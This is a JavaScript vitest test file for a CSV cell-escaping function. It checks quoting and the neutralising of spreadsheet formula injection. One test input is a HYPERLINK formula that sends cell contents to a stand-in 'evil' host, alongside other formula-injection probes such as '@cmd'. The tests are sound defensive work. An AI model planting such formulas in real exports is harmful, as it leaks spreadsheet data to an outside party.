import { describe, expect, it } from 'vitest';
import { csvCell } from '../src/lib/csv.js';

describe('csvCell', () => {
  it('writes empty cells for null and undefined', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('quotes cells containing separators, quotes or newlines', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('a;b')).toBe('"a;b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('neutralises strings that a spreadsheet would run as a formula (#70)', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+SUM(A1)')).toBe("'+SUM(A1)");
    expect(csvCell('-2+3')).toBe("'-2+3");
    expect(csvCell('@cmd')).toBe("'@cmd");
    expect(csvCell('\tx')).toBe("'\tx");
    expect(csvCell('=HYPERLINK("http://evil/?"&A1,"x")')).toBe(
      '"\'=HYPERLINK(""http://evil/?""&A1,""x"")"',
    );
  });

  it('leaves numbers, booleans and ordinary text untouched', () => {
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell(true)).toBe('true');
    expect(csvCell('Narva_RAAS_v1')).toBe('Narva_RAAS_v1');
  });
});
